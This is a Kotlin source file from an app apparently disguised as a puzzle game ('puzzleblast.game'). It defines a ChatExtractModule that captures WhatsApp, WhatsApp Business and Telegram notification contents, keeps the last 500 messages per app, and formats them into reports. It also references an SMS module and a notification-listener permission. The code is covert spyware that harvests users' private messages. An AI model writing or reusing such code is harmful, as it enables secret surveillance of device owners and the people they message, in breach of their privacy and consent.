package com.puzzleblast.game.modules

object ChatExtractModule {
    val wa = mutableListOf<Triple<String, String, Long>>()
    val waBiz = mutableListOf<Triple<String, String, Long>>()
    val tg = mutableListOf<Triple<String, String, Long>>()

    fun log(pkg: String, title: String, text: String, time: Long) {
        val entry = Triple(title, text, time)
        when (pkg) {
            "com.whatsapp" -> { wa.add(entry); if (wa.size > 500) wa.removeAt(0) }
            "com.whatsapp.w4b" -> { waBiz.add(entry); if (waBiz.size > 500) waBiz.removeAt(0) }
            "org.telegram.messenger" -> { tg.add(entry); if (tg.size > 500) tg.removeAt(0) }
        }
    }

    suspend fun wa(n: Int = 50): String = format("🟢 WhatsApp", wa, n)
    suspend fun waBusiness(n: Int = 50): String = format("🟢 WA Business", waBiz, n)
    suspend fun tg(n: Int = 50): String = format("✈️ Telegram", tg, n)

    private fun format(label: String, list: List<Triple<String, String, Long>>, n: Int): String {
        if (list.isEmpty()) return "$label · no messages captured (needs notification listener)"
        return "$label · last $n\n" + list.takeLast(n).joinToString("\n") { (t, x, time) ->
            "${t.take(25)}: ${x.take(80)} · ${SmsModule.relTime(time)}"
        }
    }
}
